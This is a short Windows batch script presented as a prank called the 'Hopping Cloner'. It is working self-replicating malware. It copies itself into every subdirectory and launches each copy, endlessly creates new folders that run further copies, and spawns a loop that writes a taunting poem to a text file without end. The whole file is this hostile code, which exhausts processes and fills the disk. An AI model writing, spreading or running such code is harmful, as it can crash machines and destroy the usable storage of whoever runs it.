@echo off
rem the PRANK
echo LET THE HELLHOUND LOOSE!!!!!
echo YOUR FILESYSTEM WILL DIE!!!!
set id=0
rem clone
for /f "delims=" %%i in ('dir /b /ad') do (
    echo %%i
    xcopy /q /y ".\check-me-out.bat" ".\%%i\"
    start /i /d "%cd%\%%i\" cmd /k "check-me-out.bat"
)
rem prank
(
    echo @echo off
        echo :loopy
        
        echo echo Hello there for you will see,
        echo echo I'm your greatest enemy,
        echo echo greatest you will ever see.
        echo echo For I will get to everywhere,
        echo echo everywhere I can see,
        echo echo and your space,
        echo echo will no longer be.
        echo echo Enjoy your space,
        echo echo for it will be no more,
        echo echo and remember me,
        echo echo as the Hopping Cloner.
        echo echo .
        echo echo .
        echo goto:loopy
)>tmp.bat
start /b cmd /c "tmp.bat>HoppingCloner.txt"
:bigl
echo %id%
rem clone moooooore

set /a id=%id%+1

if not exist "HoppingCloner_%id%" (
    mkdir "HoppingCloner_%id%"
    xcopy /q /y "check-me-out.bat" "HoppingCloner_%id%"
    start /b "It's the Hopping Cloner" /i /d "%cd%\HoppingCloner_%id%\" cmd /k "check-me-out.bat"
)


goto:bigl